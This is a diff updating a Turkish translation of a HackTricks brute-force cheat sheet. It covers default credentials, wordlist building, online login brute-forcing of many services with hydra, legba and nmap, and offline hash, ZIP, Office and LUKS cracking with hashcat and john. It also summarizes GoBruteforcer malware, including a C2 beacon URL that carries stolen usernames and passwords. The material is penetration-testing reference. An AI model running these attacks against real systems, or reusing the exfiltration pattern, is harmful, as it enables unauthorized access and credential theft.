@@ -1,10 +1,10 @@
-# Brute Force - CheatSheet
+# Brute Force - Kısa Başvuru
 
 {{#include ../banners/hacktricks-training.md}}
 
 ## Varsayılan Kimlik Bilgileri
 
-Kullanılan teknolojiye ait varsayılan kimlik bilgilerini **Google'da arayın** veya **şu bağlantıları deneyin**:
+Kullanılan teknolojinin varsayılan kimlik bilgilerini **Google'da arayın** veya **şu bağlantıları deneyin**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -21,7 +21,7 @@ Kullanılan teknolojiye ait varsayılan kimlik bilgilerini **Google'da arayın**
 
 ## **Kendi Sözlüklerinizi Oluşturun**
 
-Hedef hakkında mümkün olduğunca fazla bilgi edinin ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:
+Hedef hakkında bulabildiğiniz kadar çok bilgi edinin ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:
 
 ### Crunch
 
@@ -51,7 +51,7 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Kurban hakkında bildiklerinize (isimler, tarihler...) dayanarak parolalar oluşturun.
+Kurban hakkında bildiklerinize (isimler, tarihler...) dayalı parolalar oluşturun.
 
 ```
 python3 cupp.py -h
@@ -59,7 +59,7 @@ python3 cupp.py -h
 
 ### [Wister](https://github.com/cycurity/wister)
 
-Belirli bir hedef için kullanabileceğiniz özgün ve ideal bir wordlist oluşturmak üzere, bir dizi kelime sağlamanıza ve bu kelimelerden birden fazla varyasyon üretmenize olanak tanıyan bir wordlist oluşturma aracı.
+Bir wordlist oluşturma aracı. Bir kelime kümesi girerek bu kelimelerin farklı varyasyonlarını oluşturabilir, belirli bir hedefe uygun benzersiz ve ideal bir wordlist hazırlayabilirsiniz.
 
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
@@ -82,7 +82,7 @@ Finished in 0.920s.
 
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlist'ler
+### Wordlists
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -99,11 +99,11 @@ Finished in 0.920s.
 
 GoBruteforcer malware'inin tarama iş akışında aşağıdaki davranışlar gözlemlenmiştir; kesin değerler örneğe özgüdür.<sup>[[1]](#references)</sup>
 
-- **Mimariye göre ayarlanmış worker pool'ları** kullanın (örneğin, `x86_64/arm64` üzerinde aynı anda 95 worker, `i686` üzerinde 85, `armv5tel` üzerinde 35 ve diğer mimarilerde varsayılan olarak 50 worker). Aktif worker'ları her saniye kontrol edin ve sayıları hedefin altına düştüğünde yenilerini başlatın; her worker çıkmadan önce en fazla bir hedef IP'yi işler.
-- **Rastgele genel IPv4 adresleri** üretin, ancak yönlendirilemeyen belirgin aralıkları ve operatörlerin özellikle kaçındığı bazı aralıkları atlayın: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, bulut sistemlerinin yoğun olduğu `/8` ağları (`3/15/16/56`) ve DoD ile ilişkili `/8` ağları (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Servis portunu** kısa bir timeout (~2s) ile kontrol edin; ardından **cleartext login** girişiminde bulunun (FTP/21, MySQL/3306, Postgres/5432, HTTP/80 üzerinden phpMyAdmin). C2 kimlik bilgileri alınamazsa küçük bir yerleşik kimlik bilgisi listesine geçin.
-- Bulunan sonuçları, `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` gibi kısa HTTP GET sinyalleriyle dışarı aktarın (`1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres` gibi servis kodları kullanın); normal görünmek için yaygın bir tarayıcı User-Agent'ını yeniden kullanın.
-- **phpMyAdmin spray** ile `GET /index.php?lang=en` kullanarak yaklaşık 80 olası yolu brute-force edebilirsiniz. PMA belirteçlerini (`pmahomme` teması/`phpmyadmin.css`/`navigation.php`) tespit edin ve kimlik doğrulama yöntemini belirlemek için `codemirror.css?v=X.Y.Z` değerini ayrıştırın: `<4.9` sürümleri `pma_username`/`pma_password` GET parametrelerini kabul eder; `>=4.9` sürümleri ise `server=1`, CSRF `token` ve aynı kimlik bilgileriyle POST kullanır.
+- **Mimariye göre ayarlanmış worker pool'ları** kullanın (örneğin, `x86_64/arm64` üzerinde aynı anda 95 worker, `i686` üzerinde 85, `armv5tel` üzerinde 35 ve diğer mimarilerde varsayılan olarak 50 worker); etkin worker'ları her saniye kontrol edin ve sayıları hedefin altına düştüğünde yenilerini başlatın. Her worker, çıkmadan önce en fazla bir hedef IP'yi işler.
+- **Rastgele herkese açık IPv4 adresleri** oluşturun; ancak açıkça yönlendirilemeyen ve operatör tarafından tarama dışı bırakılan belirli aralıkları atlayın: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, bulut kullanımının yoğun olduğu `/8` aralıkları (`3/15/16/56`) ve DoD ile ilişkili `/8` aralıkları (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Açık metinle giriş denemeleri** yapmadan önce servis portunu kısa bir timeout ile (~2s) kontrol edin (FTP/21, MySQL/3306, Postgres/5432, HTTP/80 üzerinden phpMyAdmin); C2 kimlik bilgisi alınamazsa küçük bir yerleşik kimlik bilgisi listesine başvurun.
+- Yaygın bir tarayıcı User-Agent'ını yeniden kullanarak, bulunan sonuçları `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` gibi küçük HTTP GET beacon'larıyla dışarı aktarın (servis kodları: `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`).
+- **phpMyAdmin spray**, `GET /index.php?lang=en` ile olası yaklaşık 80 yolu brute-force edebilir, PMA belirteçlerini (`pmahomme` teması/`phpmyadmin.css`/`navigation.php`) tespit edebilir ve kimlik doğrulama yöntemini belirlemek için `codemirror.css?v=X.Y.Z` sürümünü ayrıştırabilir: `<4.9` sürümleri `pma_username`/`pma_password` GET parametrelerini kabul eder; `>=4.9` sürümlerinde `server=1`, CSRF `token` ve aynı kimlik bilgileriyle POST kullanılır.
 
 ## Servisler
 
@@ -127,7 +127,7 @@ msf> run
 nmap --script ajp-brute -p 8009 <IP>
 ```
 
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM ve Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
 
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
@@ -197,16 +197,16 @@ legba http.ntlm1 --domain example.org --workstation client --username admin --pa
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
 
-### HTTP - POST Formu
+### HTTP - Post Form
 
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
 
-http**s** için "http-post-form" değerini "**https-post-form" olarak değiştirmeniz gerekir
+http**s** için "http-post-form" ifadesini "**https-post-form**" olarak değiştirmeniz gerekir
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla veya (D)rupal ya da (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
 
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
@@ -345,13 +345,13 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
 
-**patator** ile **oracle_login** kullanmak için şunları **yüklemeniz** gerekir:
+**oracle_login**'ı **patator** ile kullanmak için şunu **yüklemeniz** gerekir:
 
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
 
-[Çevrimdışı OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):
+[Çevrimdışı OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**sürümler 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -384,7 +384,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 
 ### PPTP
 
-Yüklemek için `.deb` paketini [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) adresinden indirebilirsiniz.
+Kurulum için `.deb` paketini [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) adresinden indirebilirsiniz.
 
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
@@ -511,13 +511,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 
-#### Zayıf SSH anahtarları / Debian tahmin edilebilir PRNG
+#### Zayıf SSH keys / Debian tahmin edilebilir PRNG
 
-Bazı sistemlerde, kriptografik materyal oluşturmak için kullanılan rastgele seed'de bilinen kusurlar bulunur. Bu durum, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla brute-force uygulanabilecek ölçüde küçültülmüş bir keyspace'e yol açabilir. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) gibi önceden oluşturulmuş zayıf anahtar kümeleri de mevcuttur.
+Bazı sistemlerde, kriptografik materyal oluşturmak için kullanılan random seed'de bilinen kusurlar bulunur. Bu durum, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla brute force uygulanabilecek şekilde keyspace'in önemli ölçüde daralmasına yol açabilir. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) gibi önceden oluşturulmuş zayıf anahtar kümeleri de mevcuttur.
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ ve OpenMQ)
 
-STOMP metin protokolü, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler mesaj kuyruğu hizmetleriyle **sorunsuz iletişim ve etkileşime olanak tanıyan** yaygın olarak kullanılan bir mesajlaşma protokolüdür. Mesaj alışverişi yapmak ve çeşitli mesajlaşma işlemlerini gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.
+STOMP metin protokolü, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler message queueing hizmetleriyle **sorunsuz iletişim ve etkileşim sağlayan** yaygın olarak kullanılan bir messaging protokolüdür. Mesaj alışverişi yapmak ve çeşitli messaging işlemlerini gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.
 
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
@@ -570,7 +570,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
 - [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1, ESS/SSP ile veya olmadan ve herhangi bir challenge değeriyle)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash'ler, WPA2 yakalamaları ve MSOffice, ZIP, PDF... arşivleri)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash'ler, WPA2 capture'ları ve MSOffice, ZIP, PDF arşivleri...)
 - [https://crackstation.net/](https://crackstation.net) (Hash'ler)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
 - [https://gpuhash.me/](https://gpuhash.me) (Hash'ler ve dosya hash'leri)
@@ -580,7 +580,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Bir Hash'e brute force uygulamayı denemeden önce şuna göz atın.
+Bir Hash'e brute force uygulamadan önce buna göz atın.
 
 ### ZIP
 
@@ -602,8 +602,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 
 #### Known plaintext zip attack
 
-Şifrelenmiş zip dosyasının içinde bulunan bir dosyanın **plaintext**'ini (veya plaintext'in bir kısmını) bilmeniz gerekir. Şifrelenmiş bir zip dosyasının içindeki **dosya adlarını ve boyutlarını** şu komutu çalıştırarak kontrol edebilirsiniz: **`7z l encrypted.zip`**\
-[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) dosyasını releases sayfasından indirin.
+Şifrelenmiş zip dosyasının içindeki bir dosyanın **plaintext**'ini (veya plaintext'in bir kısmını) bilmeniz gerekir. Şifrelenmiş zip dosyasının içindeki **dosya adlarını ve dosya boyutlarını** şu komutla kontrol edebilirsiniz: **`7z l encrypted.zip`**\
+[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)uygulamasını releases sayfasından indirin.
 
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -641,9 +641,9 @@ sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 
-### PDF Sahip Parolası
+### PDF Owner Parolası
 
-PDF Sahip parolasını kırmak için şuna göz atın: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner parolasını kırmak için şuna bakın: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 
@@ -709,7 +709,7 @@ ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
 
-Başka bir Luks BF rehberi: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Başka bir Luks BF eğitimi: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 
@@ -719,7 +719,7 @@ Başka bir Luks BF rehberi: [http://blog.dclabs.com.br/2020/03/bruteforcing-linu
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
 
-### PGP/GPG Özel anahtarı
+### PGP/GPG Private key
 
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
@@ -732,13 +732,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Kullanın [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) ve ardından john
+[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kullanın, ardından john'u çalıştırın.
 
 ### Open Office Parola Korumalı Sütun
 
-Parolayla korunan bir sütunu olan bir xlsx dosyanız varsa, korumayı kaldırabilirsiniz:
+Parolayla korunan bir sütuna sahip bir xlsx dosyanız varsa, korumayı kaldırabilirsiniz:
 
-- **Google Drive'a yükleyin**; parola otomatik olarak kaldırılır
+- **Dosyayı Google Drive'a yükleyin**; parola otomatik olarak kaldırılır.
 - **Elle kaldırmak** için:
 
 ```bash
@@ -770,16 +770,16 @@ hash-identifier
 > <HASH>
 ```
 
-### Kelime Listeleri
+### Wordlist'ler
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Kelime Listesi Oluşturma Araçları**
+### **Wordlist Oluşturma Araçları**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, tuş haritası ve rotalarla gelişmiş bir keyboard-walk oluşturucusu.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, klavye düzeni ve rotalarla gelişmiş keyboard-walk oluşturucusu.
 
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
@@ -787,7 +787,7 @@ kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction
 
 ### John mutation
 
-_**/etc/john/john.conf**_ dosyasını okuyun ve yapılandırın
+_**/etc/john/john.conf**_ dosyasını okuyup yapılandırın.
 
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
@@ -798,9 +798,9 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Hashcat saldırıları
 
-- **Wordlist attack** (`-a 0`), rules kullanarak
+- **Wordlist saldırısı** (`-a 0`) rules ile
 
-**Hashcat** zaten **rules içeren bir klasörle** gelir ancak [**burada başka ilgi çekici rules bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat**, **rules içeren bir klasörle** birlikte gelir ancak [**burada başka ilgi çekici rules bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
@@ -808,9 +808,9 @@ hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 
 #### Kural dosyalarını açıklama ve profilleme
 
-Hashcat kuralları opcode'ları soldan sağa yürütür. İşlemler sıfırıncı konumda uygulandığında bunu yanlış anlamak kolaydır: `^e ^h ^t`, önce `e`, sonra `h`, ardından `t` ekler ve böylece `password` sözcüğünü `thepassword` olarak değiştirir. Değiştirme işlemleri büyük/küçük harfe duyarlı bayt karşılaştırmaları yapar; bu nedenle `sa@` gibi bir kural, büyük harfli `A` için hiçbir değişiklik yapmaz. Bilinmeyen kuralları GPU zamanını harcamadan önce temsili küçük harfli, büyük harfli ve karışık harfli temel sözcüklerle test edin.<sup>[[6]](#references)[[9]](#references)</sup>
+Hashcat kuralları opcode'ları soldan sağa yürütür. İşlemler sıfırıncı konumda uygulandığında bunu yanlış yorumlamak kolaydır: `^e ^h ^t`, önce `e`, sonra `h`, ardından `t` ekler ve böylece `password` sözcüğünü `thepassword` olarak değiştirir. Değiştirmeler büyük/küçük harfe duyarlı bayt karşılaştırmalarıdır; bu nedenle `sa@` gibi bir kural, büyük harfli `A` için işlem yapmaz. Alışılmadık kuralları GPU zamanı harcamadan önce küçük harfli, büyük harfli ve büyük-küçük harf karışık örnek temel sözcüklerle test edin.<sup>[[6]](#references)[[9]](#references)</sup>
 
-[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) her ara adayı gösterebilir ve eksiksiz bir kural dosyasındaki opcode dağılımını özetleyebilir. Statik opcode sayımları, bir dosyanın çoğunlukla karakter eklediğini, başa karakter eklediğini, karakterleri değiştirdiğini veya kestiğini ortaya koyar. Bunlar bir kuralın parolayı kıracağını kanıtlamaz; ancak hedef popülasyonda gözlemlenen parola örüntülerine uygun bir kural kümesi seçmeye yardımcı olur.<sup>[[6]](#references)[[9]](#references)</sup>
+[HashcatRosetta](https://github.com/bandrel/HashcatRosetta), her ara adayı gösterebilir ve eksiksiz bir kural dosyasındaki opcode dağılımını özetleyebilir. Statik opcode sayımları, dosyanın çoğunlukla karakter ekleyip eklemediğini, başa karakter ekleyip eklemediğini, karakterleri değiştirip değiştirmediğini veya karakterleri kesip kesmediğini ortaya çıkarır. Bunlar bir kuralın parolayı kıracağını kanıtlamaz; ancak hedef kitlenin gözlemlenen parola kalıplarıyla eşleşen bir kural kümesi seçmeye yardımcı olur.<sup>[[6]](#references)[[9]](#references)</sup>
 
 ```bash
 uv tool install git+https://github.com/bandrel/HashcatRosetta.git
@@ -818,9 +818,9 @@ hashcat-rosetta --explain '^e ^h ^t' --baseword password
 hashcat-rosetta rules.rule --analyze-rules
 ```
 
-#### Debug loglarıyla yinelenen kuralları azaltın
+#### Debug loglarıyla yinelenen kuralları azaltma
 
-Hashcat debug mode, rule dönüşümlerini normal durum ve sonuç çıktılarından ayrı kaydeder. Mode `4`, `baseword:rule:candidate` biçiminde yazar; mode `5` ise kaynak wordlist'i ekler. `--debug-file` seçeneğini her zaman açıkça belirtin. Aksi takdirde Hashcat, profil dizininde `hashcat.debugfile` dosyasını açar ve stdout'u yönlendirmek bu kayıtlar yerine konsol akışını yakalar. Debug dosyaları ekleme modunda açılır; bu nedenle yeni bir ölçümden önce eski dosyayı silin veya döndürün ve plaintext baseword'ler ile adayları içerdiği için dosyayı koruyun.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+Hashcat debug modu, kural dönüşümlerini normal durum ve sonuç çıktısından ayrı kaydeder. Mod `4`, `temelkelime:kural:aday` yazar; mod `5` ise kaynak kelime listesini ekler. Her zaman `--debug-file` seçeneğini açıkça belirtin. Aksi takdirde Hashcat, profil dizinindeki `hashcat.debugfile` dosyasını açar ve stdout'u yönlendirmek bu kayıtlar yerine konsol akışını yakalar. Debug dosyaları ekleme modunda açılır; bu nedenle yeni bir ölçüm yapmadan önce eski dosyayı silin veya döndürün ve düz metin temel kelimeler ile adaylar içerdiği için dosyayı koruyun.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
 
 ```bash
 rm -f debug.txt
@@ -832,12 +832,12 @@ hashcat-rosetta debug.txt --wordlists --detail
 hashcat-rosetta debug.txt --export report.json --format json
 ```
 
-`frequency` değerini en sık uygulanan kuralları bulmak, `basewords` değerini farklı girdi kapsamını ölçmek ve `candidates` değerini farklı çıktıları saymak için kullanın. Sık uygulanan bir kural bile birçok girdiyi yinelenen adaylara dönüştürebileceğinden, budama işlemine başlamak için genellikle adayları sıralamak en iyi yöntemdir. En değerli kuralları daha küçük bir dosyaya kopyalayın, bu dosyayı kalan hash'lere karşı yeniden çalıştırın ve çalıştırmaların raporlarını karşılaştırın. Mode `5`, her kaynak wordlist'in yararlı basewords sağlayıp sağlamadığını da gösterir; verilerdeki iki nokta üst üste işaretleri otomatik algılamayı belirsiz hâle getirdiğinde ayrıştırmayı zorlamak için `--debug-mode 4` veya `--debug-mode 5` kullanın.<sup>[[6]](#references)[[9]](#references)</sup>
+`frequency` değerini en sık uygulanan kuralları bulmak, `basewords` değerini farklı girdi kapsamını ölçmek ve `candidates` değerini farklı çıktıları saymak için kullanın. Kural sık uygulanıyor olsa bile birçok girdiyi yinelenen adaylara dönüştürebileceğinden, adayları sıralamak genellikle azaltma işlemine başlamak için en iyi yoldur. En değerli kuralları daha küçük bir dosyaya kopyalayın, bu dosyayı kalan hash’ler üzerinde yeniden çalıştırın ve çalıştırmaların raporlarını karşılaştırın. Mode `5`, her kaynak wordlist’in yararlı basewords sağlayıp sağlamadığını da gösterir; verilerdeki iki nokta üst üste işaretleri otomatik algılamayı belirsiz kıldığında ayrıştırmayı zorlamak için `--debug-mode 4` veya `--debug-mode 5` kullanın.<sup>[[6]](#references)[[9]](#references)</sup>
 
 - **Wordlist combinator** saldırısı
 
-hashcat ile **2 wordlist'i 1 wordlist'te birleştirmek** mümkündür.\
-1. listede **"hello"** sözcüğü, ikinci listede ise **"world"** ve **"earth"** sözcüklerinin bulunduğu 2 satır varsa `helloworld` ve `helloearth` sözcükleri oluşturulur.
+hashcat ile **2 wordlist’i tek bir wordlist’te birleştirmek** mümkündür.\
+İlk listede **"hello"** sözcüğü, ikincisinde ise **"world"** ve **"earth"** sözcüklerinin bulunduğu 2 satır olduğunu varsayalım. `helloworld` ve `helloearth` sözcükleri oluşturulur.
 
 ```bash
 # This will combine 2 wordlists
@@ -850,20 +850,20 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
 
-#### Grammar-driven combinator attacks (şifrelenmiş Office örneği)
+#### Grammar-driven combinator attacks (encrypted Office example)
 
-Bir parola uzun olabilir ve birkaç karakter sınıfı içerebilir; ancak bilinen bir dilbilgisi yapısını izliyorsa **etkin arama alanı** yine de küçük olabilir. Yetkili bir değerlendirme sırasında elde edilen şifrelenmiş bir Office belgesi için `office2john.py`, parola doğrulama kaydını çıkarır; bu sayede çevrimiçi hesap kilitlemeleri, hız sınırlamaları veya MFA olmadan yerel parola tahmini yapılabilir. Bu işlem belge şifrelemesini atlatmaz.<sup>[[2]](#references)[[5]](#references)</sup>
+Bir parola uzun olabilir ve birkaç karakter sınıfı içerebilir; ancak bilinen bir dilbilgisini izliyorsa **etkin arama uzayı** yine de küçük olabilir. Yetkili bir değerlendirme sırasında elde edilen şifrelenmiş bir Office belgesi için `office2john.py`, parola doğrulama kaydını çıkarır; bu sayede çevrimiçi kilitlenme, hız sınırlaması veya MFA olmadan yerel parola tahmini yapılabilir. Belge şifrelemesini aşmaz.<sup>[[2]](#references)[[5]](#references)</sup>
 
-Hashcat'in yalnızca doğrulayıcıyı alması için John'un başa eklediği dosya adı alanını kaldırın:<sup>[[2]](#references)</sup>
+Hashcat'in yalnızca doğrulayıcıyı alması için John'ın başa eklediği dosya adı alanını çıkarın:<sup>[[2]](#references)</sup>
 
 ```bash
 python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
 head -c 40 office.hash; echo
 ```
 
-Çıkarılan önekten `-m` değerini seçin; dosya uzantısından seçmeyin. Hashcat, `$office$*2007*`, `$office$*2010*` ve `$office$*2013*` değerlerini sırasıyla `9400`, `9500` ve `9600` modlarına eşler; eski `$oldoffice$0/$1` ve `$oldoffice$3/$4` kayıtları ise sırasıyla `9700` ve `9800` modlarını kullanır.<sup>[[3]](#references)</sup>
+`-m` seçimini dosya uzantısına göre değil, çıkarılan prefix'e göre yapın. Hashcat, `$office$*2007*`, `$office$*2010*` ve `$office$*2013*` değerlerini sırasıyla `9400`, `9500` ve `9600` modlarına eşler; eski `$oldoffice$0/$1` ve `$oldoffice$3/$4` kayıtları ise sırasıyla `9700` ve `9800` modlarını kullanır.<sup>[[3]](#references)</sup>
 
-Parola yeniden kullanımı, politikalar, ipuçları veya kullanıcıyı tanıyan kişilerden edinilen istihbarat `<word><number><optional !><word>` gibi bir dilbilgisi ortaya çıkarıyorsa, bağımsız olarak listelenebilen öneki sol sözlük olarak oluşturun. Bu örnek `0` ile `99` arasındaki sayıları dener; aralığı ve dönüşümleri değerlendirmenin bulgularına göre değiştirin.<sup>[[5]](#references)</sup>
+Password reuse, policies, hints veya kullanıcıyı tanıyan kişilerden edinilen bilgiler `<word><number><optional !><word>` gibi bir grammar ortaya koyuyorsa, bağımsız olarak enumerate edilebilen prefix'i sol sözlük olarak oluşturun. Bu örnekte `0` ile `99` arasındaki sayılar test edilir; aralığı ve dönüşümleri değerlendirmeden elde edilen kanıtlara göre değiştirin.<sup>[[5]](#references)</sup>
 
 ```bash
 while IFS= read -r word; do
@@ -873,13 +873,13 @@ while IFS= read -r word; do
 done < words.txt > wordsAndNumbers.txt
 ```
 
-Hashcat attack mode `1`, sağ sözlükteki her satırı sol sözlükteki her satırın sonuna ekler; bu nedenle `L` ve `R` satır içeren dosyalar, uygulanan kurallardan önce `L × R` aday üretir. Aşağıdaki komut özellikle eski `$oldoffice$3/$4` kaydı içindir; diğer Office biçimleri için modu değiştirin.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Hashcat attack mode `1`, sağdaki dictionary’deki her satırı soldaki dictionary’deki her satıra ekler; böylece dosyalarda sırasıyla `L` ve `R` satır varsa, uygulanan kurallardan önce `L × R` aday oluşturulur. Aşağıdaki komut özellikle eski bir `$oldoffice$3/$4` kaydı içindir; diğer Office biçimleri için modu değiştirin.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ```bash
 hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
 ```
 
-Bu ön işleme modeli, çevrimdışı doğrulanabilen diğer biçimlere de uygulanabilir: nominal tam uzunluğu brute-force etmek yerine, tek bir bileşen için yalnızca olası büyük-küçük harf kullanımlarını, tarihleri, ayraçları, rakamları veya noktalama işaretlerini sıralayın ve ardından bunu kalan bileşenle birleştirin.<sup>[[4]](#references)[[5]](#references)</sup>
